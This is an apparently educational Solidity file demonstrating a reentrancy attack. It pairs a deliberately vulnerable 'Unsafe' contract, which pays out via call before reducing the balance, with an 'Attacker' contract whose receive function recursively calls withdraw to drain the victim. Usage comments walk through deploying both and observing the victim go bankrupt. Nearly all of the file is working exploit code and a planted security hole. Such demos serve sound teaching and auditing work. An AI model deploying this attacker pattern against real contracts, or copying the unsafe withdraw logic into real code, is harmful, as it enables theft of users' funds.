// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

import "Debugger.sol";

/*
    Usage:
    Deploy Unsafe with value of 2.
    Deploy Attacker with address of Unsafe and value of 1 ether.
    Call Attacker.transfer.
    Call Attacker.reclaim.
    Observe Attacker having 3 ether.
    Observer Unsafe being bankrupt.
*/
contract Unsafe is Debugger {
    mapping(address => uint) public balances;
    
    event VictimReceive(address, uint);
    event VictimWithdraw(address, uint);
    
    constructor() payable {}
    
    receive() external payable {
        // IMPORTANT: modifying state in receive() causes transactions to fail
        // when called with send() or transfer().
        // Works OK when called with addr.call{value:amount}("") though.
        balances[msg.sender] += msg.value;
        emit VictimReceive(msg.sender, msg.value);
    }
    
    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient funds on your balance.");
        emit VictimWithdraw(msg.sender, amount);
        
        // Somehow this variant fails. May be related to state modification either in Unsafe or in Attacker.
        // bool res = msg.sender.send(amount);
        // emit SendDebug(msg.sender, res);
        
        // But this one works.
        (bool res, ) = msg.sender.call{value: amount}("");
        emit CallDebug(msg.sender, res, "");

        if (res){
            balances[msg.sender] -= amount;
        }
    }
}

contract Attacker is Debugger {
    address payable victim;
    uint amount = 1 * 1 ether;
    
    event AttackerReceive(address, uint);
    event AttackerTransfer1(address, uint);
    
    constructor (address payable v) payable {
        victim = v;
    }
    
    function reclaim() public {
        // Unsafe(msg.sender).withdraw(amount);
        Unsafe(victim).withdraw{gas: 1000000}(amount);
    }
    
    function transfer() public {
        (bool res, ) = victim.call{value:amount, gas: 1000000}("");
        emit CallDebug(victim, res, "");
    }
    
    receive() external payable {
        emit AttackerReceive(msg.sender, msg.value);

        if (msg.sender == victim) {
            // TODO: transfer eth to a wallet.
            // Recursively calling the victim's Unsafe.withdraw function,
            // effectively draining it's balance.
            // Unsafe(victim).withdraw{gas: 1000000}(amount);
            Unsafe(victim).withdraw(amount);
        }
    }
}
